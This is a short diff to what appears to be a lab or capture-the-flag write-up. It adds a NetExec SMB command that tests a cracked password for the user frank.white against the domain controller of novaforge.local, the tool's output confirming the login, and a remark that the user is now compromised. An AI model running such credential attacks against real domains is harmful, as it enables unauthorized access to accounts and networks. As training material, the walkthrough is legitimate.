@@ -1129,5 +1129,10 @@ frank.white:1hatefrank
 ```
 
 ```python
-
+nxc smb dc.novaforge.local -u frank.white -p '1hatefrank' --smb-timeout 5
+SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.100      445    DC               [+] novaforge.local\frank.white:1hatefrank
 ```
+
+This user is now compromised!
+
